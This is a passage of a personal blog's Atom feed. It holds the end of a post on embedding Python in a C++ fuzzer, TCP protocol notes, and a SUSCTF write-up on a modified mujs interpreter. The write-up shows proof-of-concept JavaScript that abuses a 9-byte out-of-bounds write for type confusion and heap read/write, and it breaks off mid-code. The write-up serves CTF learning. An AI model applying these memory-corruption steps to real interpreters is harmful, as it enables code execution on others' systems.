class="line">   <span class="comment">//使用PyInstanceMethod_New获取了类的构造函数方法</span></span><br><span class="line">   PyObject *pConstruct = PyInstanceMethod_New(pClass);</span><br><span class="line">   <span class="keyword">if</span>(! pConstruct) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" construct woronbg"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//使用PyObject_CallObject调用类的构造函数方法，同时生成示例instance</span></span><br><span class="line">   PyObject *pInstance = PyObject_CallObject(pConstruct, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">this</span>-&gt;pInstance = pInstance;</span><br><span class="line">   <span class="keyword">if</span> (!pInstance) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"  Person instance failed"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125; </span><br><span class="line"><span class="comment">//使用Person类对象的auth方法</span></span><br><span class="line">PyObject_CallMethod(<span class="keyword">this</span>-&gt;pInstance, <span class="string">"auth"</span>, <span class="string">"(ss)"</span>, <span class="string">"admin"</span>, <span class="string">"123qwe"</span>);</span><br><span class="line"><span class="comment">//如果调用时python出现错误，那么输出</span></span><br><span class="line">   PyErr_Print(); </span><br><span class="line"><span class="comment">//释放</span></span><br><span class="line">   Py_DECREF(pInstance);</span><br><span class="line">   Py_DECREF(pClass);</span><br><span class="line">   Py_DECREF(pDict);</span><br><span class="line">   Py_DECREF(pModule);</span><br><span class="line"><span class="comment">// 关闭虚拟机</span></span><br><span class="line">Py_Finalize();</span><br></pre></td></tr></table></figure><h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><p>类似于下图这种会出现内存泄漏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Python version: "</span> &lt;&lt; PY_VERSION &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Py_Initialize();</span><br><span class="line">        <span class="comment">//PyGC_Collect();</span></span><br><span class="line">        Py_Finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[解决方案](<a href="https://stackoverflow.com/questions/42971734/memory-leak-when-embedding-python-into-my-application" target="_blank" rel="noopener">c++ - Memory leak when embedding python into my application - Stack Overflow</a>)</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>[C++调用python脚本 - 知乎 (zhihu.com)](<a href="https://zhuanlan.zhihu.com/p/79896193#:~:text=C%2FC%2B%2B中调用,的所有初始化，" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/79896193#:~:text=C%2FC%2B%2B中调用,的所有初始化，</a> 并销毁)</p><p><a href="https://blog.csdn.net/hnlylyb/article/details/89498651" target="_blank" rel="noopener">C调用python类的正确方法_hnlylyb的博客-CSDN博客_c调用python类的正确方法</a></p><p><a href="https://www.cnblogs.com/lancelod/p/4036922.html" target="_blank" rel="noopener">[C++/Python] 如何在C++中使用一个Python类? (Use Python-defined class in C++) - Lancelod_Liu - 博客园 (cnblogs.com)</a></p><p><a href="https://www.xmodulo.com/embed-python-code-in-c.html" target="_blank" rel="noopener">How to embed Python code in C program (xmodulo.com)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近使用C++实现了一个fuzz。但是发现对应目标有认证流程，我的fuzz代码上也得加上这个加密认证逻辑才能正常工作。经过谷哥的帮助，在网上找到了一段python实现的加密认证逻辑。&lt;/p&gt;
&lt;p&gt;让我自己用C++重写？那是不可能的，于是就走上了用C++调用python的踩坑之路。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程" scheme="wood1314.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>TCP/IP协议安全问题</title>
    <link href="wood1314.github.io/year/07/01/clgvp3n5l001u6n3fxtybaxo5/"/>
    <id>wood1314.github.io/year/07/01/clgvp3n5l001u6n3fxtybaxo5/</id>
    <published>2022-07-01T02:55:05.000Z</published>
    <updated>2022-07-04T03:57:17.577Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下tcp阻断。</p><a id="more"></a><h1 id="TCP基础知识"><a href="#TCP基础知识" class="headerlink" title="TCP基础知识"></a>TCP基础知识</h1><h2 id="1-1-TCP报文格式"><a href="#1-1-TCP报文格式" class="headerlink" title="1.1 TCP报文格式"></a>1.1 TCP报文格式</h2><p><img src="https://zhangbinalan.gitbooks.io/protocol/content/Center.gif" alt></p><p>在TCP/IP 连接中比较重要的有</p><ul><li>源端口</li><li>目的端口</li><li>数据序号</li><li>确认序号</li><li>源IP</li><li>目的IP</li></ul><h2 id="1-2-TCP链接状态"><a href="#1-2-TCP链接状态" class="headerlink" title="1.2 TCP链接状态"></a>1.2 TCP链接状态</h2><p>​    <img src="https://pic.imgdb.cn/item/62be68f41d64b0706681fde1.png" alt></p><p>TCP连接生命周期状态：</p><ul><li>LISTEN等待远程的TCP连接请求</li><li>SYS_SENT 发送了建立连接的请求，等待确认消息</li><li>SYN_RECIVED 收到了对方建立连接的请求并发送了建立连接的请求。等待对方确认自己发送的链接请求</li><li>ESTABLISHED 连接已经建立，可以进行正常数据传输</li><li>FIN_WAIT_1 等待对方确认刚刚发送的关闭连接的请求</li><li>FIN_WAIT_2 收到关闭连接请求的确认，等待对方发送关闭连接的请求</li><li>CLOSE_WAIT确认了对方的关闭连接请求，等待本地用户关闭连接指令</li><li>LAST-ACK 被动关闭的一方，在CLOSE-WAIT状态下收到用户关闭连接的指令，发送关闭连接请求，等待确认</li><li>TIME-WAIT 主动关闭连接的一方收到对方发送的对方关闭连接请求的确认消息后,等待足够长的时间（2MSL）以确保对方接收到ACK包.最后回到CLOSED状态，释放网络资源</li><li>CLOSED 关闭状态</li></ul><h2 id="1-3-三次握手"><a href="#1-3-三次握手" class="headerlink" title="1.3 三次握手"></a>1.3 三次握手</h2><p>​    <img src="https://pic.imgdb.cn/item/62c25ea05be16ec74ad66e54.png" alt></p><p>（1）第一次握手：建立连接时，客户端A发送SYN包（SYN=j）到服务器B，并进入SYN_SEND状态，等待服务器B确认。</p><p>（2）第二次握手：服务器B收到SYN包，必须确认客户A的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器B进入SYN_RECV状态。</p><p>（3）第三次握手：客户端A收到服务器B的SYN＋ACK包，向服务器B发送确认包ACK（ACK=k+1），此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。</p><h2 id="1-4-四次挥手"><a href="#1-4-四次挥手" class="headerlink" title="1.4 四次挥手"></a>1.4 四次挥手</h2><p><img src="https://pic.imgdb.cn/item/62c25fea5be16ec74ad7d2e6.png" alt></p><p>由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。</p><p>CP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在socket编程中，任何一方执行close()操作即可产生挥手操作。</p><p>（1）客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。</p><p>（2）服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。</p><p>（3）服务器B关闭与客户端A的连接，发送一个FIN给客户端A。</p><p>（4）客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。</p><p>以上就是TCP协议关闭连接的过程，现在说一下TIME_WAIT状态。<br>从上面可以看到，主动发起关闭连接的操作的一方将达到TIME_WAIT状态，而且这个状态要保持Maximum Segment Lifetime的两倍时间。</p><p>原因有二：<br>一、保证TCP协议的全双工连接能够可靠关闭<br>二、保证这次连接的重复数据段从网络中消失</p><p>先说第一点，如果Client直接CLOSED了，那么由于IP协议的不可靠性或者是其它网络原因，导致Server没有收到Client最后回复的ACK。那么Server就会在超时之后继续发送FIN，此时由于Client已经CLOSED了，就找不到与重发的FIN对应的连接，最后Server就会收到RST而不是ACK，Server就会以为是连接错误把问题报告给高层。这样的情况虽然不会造成数据丢失，但是却导致TCP协议不符合可靠连接的要求。所以，Client不是直接进入CLOSED，而是要保持TIME_WAIT，当再次收到FIN的时候，能够保证对方收到ACK，最后正确的关闭连接。</p><p>再说第二点，如果Client直接CLOSED，然后又再向Server发起一个新连接，我们不能保证这个新连接与刚关闭的连接的端口号是不同的。也就是说有可能新连接和老连接的端口号是相同的。一般来说不会发生什么问题，但是还是有特殊情况出现：假设新连接和已经关闭的老连接端口号是一样的，如果前一次连接的某些数据仍然滞留在网络中，这些延迟数据在建立新连接之后才到达Server，由于新连接和老连接的端口号是一样的，又因为TCP协议判断不同连接的依据是socket pair，于是，TCP协议就认为那个延迟的数据是属于新连接的，这样就和真正的新连接的数据包发生混淆了。所以TCP连接还要在TIME_WAIT状态等待2倍MSL，这样可以保证本次连接的所有数据都从网络中消失。</p><h2 id="1-5-TCP-中的-RST"><a href="#1-5-TCP-中的-RST" class="headerlink" title="1.5 TCP 中的 RST"></a>1.5 TCP 中的 RST</h2><p>RST：（Reset the connection）用于复位因某种原因引起出现的错误连接，也用来拒绝非法数据和请求。如果接收到RST位时候，通常发生了某些错误；<br>发送RST包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓冲区中的包，发送RST；<br>接收端收到RST包后，也不必发送ACK包来确认。</p><h3 id="何时发送RST"><a href="#何时发送RST" class="headerlink" title="何时发送RST"></a>何时发送RST</h3><p>1：如果连接是CLOSE状态，所有收到的包都响应RST，仍然保持CLOSED状态<br>如果收到的是ACK报文，RST取ACK报文的ACK序列号为RST报文的SEQ；如果报文不是ACK报文，RST的SEQ为0且ACK字段为收到的报文SEQ+报文长度；</p><p>2：如果连接在non-synchronized状态（LISTEN/SYN-SENT/SYN-RECEIVED），收到的报文ACK的无效的序列号（发送的SYN没有被确认），需要返回RST报文；连接保持原有状态；<br>如果是ACK报文，RST取ACK报文的ACK序列号为RST报文的SEQ；如果报文不是ACK报文，RST的SEQ为0且ACK字段为收到的报文SEQ+报文长度；</p><p>3：如果连接在synchronized状态（ESTABLISHED,FIN-WAIT-1, FIN-WAIT-2, CLOSE-WAIT, CLOSING, LAST-ACK, TIME-WAIT）,如果收到不可接受的报文（序列号不在接收窗口内或者ack的字段不正确），只发送一个确认报文（ACK字段为期望ACK的序列号，SEQ为当前发送序列号），状态变保持原样；</p><h3 id="收到RST报文如何处理"><a href="#收到RST报文如何处理" class="headerlink" title="收到RST报文如何处理"></a>收到RST报文如何处理</h3><p><strong>收到RST报文，除了SYN-SENT状态，都需要校验SEQ字段是否在接收窗口；SYN-SENT状态下，如果RST的确认了刚刚发送的SYN报文，RST才有效；</strong></p><p>校验了RST报文后，如果是在LISTEN状态则保持该状态不需要改变；<br>如果是在SYN-RECIEVED状态且之前在LISTEN状态，恢复为LISTEN状态，如果之前为SYN-RECIEVED状态且之前不是LISTEN状态，则CLOSED；<br>其他状态，关闭连接通知用户，状态变为CLOSED</p><h1 id="针对tcp的攻击"><a href="#针对tcp的攻击" class="headerlink" title="针对tcp的攻击"></a>针对tcp的攻击</h1><p>未完待续</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习一下tcp阻断。&lt;/p&gt;
    
    </summary>
    
      <category term="程序员的自我修养" scheme="wood1314.github.io/categories/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    
    
      <category term="计算机网络" scheme="wood1314.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>SUSCTF mujs 复现</title>
    <link href="wood1314.github.io/year/03/01/clgvp3n5m001x6n3fllc6vezm/"/>
    <id>wood1314.github.io/year/03/01/clgvp3n5m001x6n3fllc6vezm/</id>
    <published>2022-02-28T16:01:04.000Z</published>
    <updated>2022-03-02T07:23:48.281Z</updated>
    
    <content type="html"><![CDATA[<p>这次跟着SU参加SUSCTF取得了第一名的成绩，希望SU战队越来越好！这道mujs当时自己只看出了有越界写操作，想到了可以进行一个类型混淆的利用，但是最后还是队友做出来了。在此记录一下复线思路（翻译一下队友详细的wp）。</p><a id="more"></a><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>出题人给出的题目描述如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd0a0972b4428771e6a3887da2210c7c9dd40f9c  </span><br><span class="line">nc 124.71.182.21 9999</span><br></pre></td></tr></table></figure><p>在附件中有<code>mujs</code>的源码，这个是一个在嵌入式设备上常用的js代码解释器。这个源码的代码量还是很大的。同时附件里还有一个编译好的二进制文件，以及libc文件。从libc文件可以得知远程的运行环境是libc.2.31</p><p>题目描述中给出的这个hash字符告诉我们这个源码是来自于这个hash对应的commit的<code>mujs</code>源码</p><p><a href="https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c" target="_blank" rel="noopener">https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c</a> </p><p>所以使用diff对比了这两个源码。发现主要的差别在两个地方</p><ul><li>一些内置方法在main.c中被禁用了</li><li>新增了dataview.c文件。这个是[DataView](<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView - JavaScript | MDN (mozilla.org)</a>)方法的一个简化版的实现</li></ul><h2 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h2><p>队友的思路首先是从最近的CVE里寻找一些漏洞，但是没有发现有用的信息，所以这个题应该是魔改的这个版本的源码。而且被魔改的部分其实代码量不算大，直接审就好了。</p><p>首先我们需要理解DataView都做了什么，都有哪些方法。一些常用的用法如下所示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="number">10</span>)</span><br><span class="line">print(x.getUint8(<span class="number">0</span>))</span><br><span class="line">print(x.getUint8(<span class="number">9</span>))</span><br><span class="line">print(x.getUint8(<span class="number">12</span>)) <span class="comment">// should not work</span></span><br><span class="line">print(x.setUint32(<span class="number">0</span>, <span class="number">10</span>))</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其实从<code>jsB_initdataview</code>函数当中大概可以看出来都有哪些方法，然后自己试一下就可以试出来这些方法怎么用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> jsB_initdataview(js_State *J)</span><br><span class="line">&#123;</span><br><span class="line">js_pushobject(J, J-&gt;DataView_prototype);</span><br><span class="line">&#123;</span><br><span class="line">jsB_propf(J, <span class="string">"DataView.prototype.getUint8"</span>, Dv_getUint8, <span class="number">1</span>);</span><br><span class="line">jsB_propf(J, <span class="string">"DataView.prototype.setUint8"</span>, Dv_setUint8, <span class="number">2</span>);</span><br><span class="line">jsB_propf(J, <span class="string">"DataView.prototype.getUint16"</span>, Dv_getUint16, <span class="number">1</span>);</span><br><span class="line">jsB_propf(J, <span class="string">"DataView.prototype.setUint16"</span>, Dv_setUint16, <span class="number">2</span>);</span><br><span class="line">jsB_propf(J, <span class="string">"DataView.prototype.getUint32"</span>, Dv_getUint32, <span class="number">1</span>);</span><br><span class="line">jsB_propf(J, <span class="string">"DataView.prototype.setUint32"</span>, Dv_setUint32, <span class="number">2</span>);</span><br><span class="line">jsB_propf(J, <span class="string">"DataView.prototype.getLength"</span>, Dv_getLength, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">js_newcconstructor(J, jsB_new_DataView, jsB_new_DataView, <span class="string">"DataView"</span>, <span class="number">0</span>);</span><br><span class="line">js_defglobal(J, <span class="string">"DataView"</span>, JS_DONTENUM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后经过一阵审计，很容易就能发现这里存在一个越界写操作，可以越界写9字节</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> Dv_setUint8(js_State *J)</span><br><span class="line">&#123;</span><br><span class="line">js_Object *self = js_toobject(J, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (self-&gt;type != JS_CDATAVIEW) js_typeerror(J, <span class="string">"not an DataView"</span>);</span><br><span class="line">size_t index = js_tonumber(J, <span class="number">1</span>);</span><br><span class="line">uint8_t value = js_tonumber(J, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (index &lt; self-&gt;u.dataview.length+<span class="number">0x9</span>) &#123;</span><br><span class="line">self-&gt;u.dataview.data[index] = value;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">js_error(J, <span class="string">"out of bounds access on DataView"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得注意的是这里同时也存在一个整数溢出（但是是无符号的)，可以让我们可以前溢9字节。但是由于这里没有什么free的操作，所以很难利用。因此还是后溢9字节可用性高一点。</p><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>因为说溢出9字节，这个多出的一字节很容易令人联想到类型混淆。下面是 js_Object 的结构。可见只要溢出一字节就可以覆盖它的type字段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">js_Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">enum</span> js_Class type;</span><br><span class="line">        <span class="keyword">int</span> extensible;</span><br><span class="line">        js_Property *properties;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面给出类型混淆的poc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">8</span>); <span class="comment">// change type of c to something</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[object <span class="built_in">DataView</span>]</span><br><span class="line">[object <span class="built_in">String</span>]</span><br></pre></td></tr></table></figure><h3 id="越界写Dataview的Length字段"><a href="#越界写Dataview的Length字段" class="headerlink" title="越界写Dataview的Length字段"></a>越界写Dataview的Length字段</h3><p>js_Objec 使用了 C语言里的union结构，所以不同类型可以共用相同的内存。队友的想法是利用与DataView里Length字段占用内存相同的其他类型的字符来修改DataLength。<strong>这样我们就可以扩大任意地址读写的范围，起码可以拓展到整个堆上了，而不仅仅是越界9字节。</strong></p><p>整个Js_Objec 结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">js_Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">enum</span> js_Class type;</span><br><span class="line">        <span class="keyword">int</span> extensible;</span><br><span class="line">        js_Property *properties;</span><br><span class="line">        <span class="keyword">int</span> count; </span><br><span class="line">        js_Object *prototype;</span><br><span class="line">        <span class="keyword">union</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> boolean;</span><br><span class="line">                <span class="keyword">double</span> number;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">                        <span class="keyword">int</span> length;</span><br><span class="line">                &#125; s;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">int</span> length;</span><br><span class="line">                &#125; a;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        js_Function *function;</span><br><span class="line">                        js_Environment *scope;</span><br><span class="line">                &#125; f;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">                        js_CFunction function;</span><br><span class="line">                        js_CFunction constructor;</span><br><span class="line">                        <span class="keyword">int</span> length;</span><br><span class="line">                        <span class="keyword">void</span> *data;</span><br><span class="line">                        js_Finalize finalize;</span><br><span class="line">                &#125; c;</span><br><span class="line">                js_Regexp r;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        js_Object *target;</span><br><span class="line">                        js_Iterator *head;</span><br><span class="line">                &#125; iter;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">const</span> <span class="keyword">char</span> *tag;</span><br><span class="line">                        <span class="keyword">void</span> *data;</span><br><span class="line">                        js_HasProperty has;</span><br><span class="line">                        js_Put put;</span><br><span class="line">                        js_Delete <span class="keyword">delete</span>;</span><br><span class="line">                        js_Finalize finalize;</span><br><span class="line">                &#125; user;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="keyword">uint32_t</span> length;</span><br><span class="line">                    <span class="keyword">uint8_t</span>* data;</span><br><span class="line">                &#125; dataview;</span><br><span class="line">        &#125; u;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>比如<code>js_Object.u.dataview.length</code> 在结构体内所处的偏移是和<code>js_Object.u.number</code> 以及<code>s_Object.u.c.name</code>这两个是相同的。</p><p>所以我们可以修改<code>js_Object.u.number</code>，队友找到了下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">js_setdate</span><span class="params">(js_State *J, <span class="keyword">int</span> idx, <span class="keyword">double</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        js_Object *self = js_toobject(J, idx);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;type != JS_CDATE)</span><br><span class="line">                js_typeerror(J, <span class="string">"not a date"</span>);</span><br><span class="line">        self-&gt;u.number = TimeClip(t);</span><br><span class="line">        js_pushnumber(J, self-&gt;u.number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... called from here</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dp_setTime</span><span class="params">(js_State *J)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        js_setdate(J, <span class="number">0</span>, js_tonumber(J, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们试一下</p><p><code>JS_CDATE</code>的值是10，我们需要把这个DataView结构的type字段溢出成10就可以了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set type of c to Date</span></span><br><span class="line">print(c)</span><br><span class="line">c.setTime(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[object DataView]</span><br><span class="line">[object Date]</span><br><span class="line">TypeError: undefined is not callable</span><br><span class="line">        at tconf.js:10</span><br></pre></td></tr></table></figure><p>Emmm，居然是报错了。难道进行了类型混淆还是不能调用setTime方法么？队友曾经为了这个问题困扰了许久，他意识到了对象的prototype 在我们一创建的时候其实就已经确定了。所以当我们改变type的时候prototype并没有改变。而prototype基本就已经定义了这个对象可以调用哪些方法，可恶。</p><p>这时无敌的队友发现，js里有个讨厌的东西叫 <code>this</code>，这个东西在这个时候算是雪中送碳吧</p><p>我们仍然可以通过js的<code>bind</code>调用<code>setTime</code> :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Date</span>.prototype.setTime.bind(c)(<span class="number">12</span>)</span><br></pre></td></tr></table></figure><p>成功了！</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 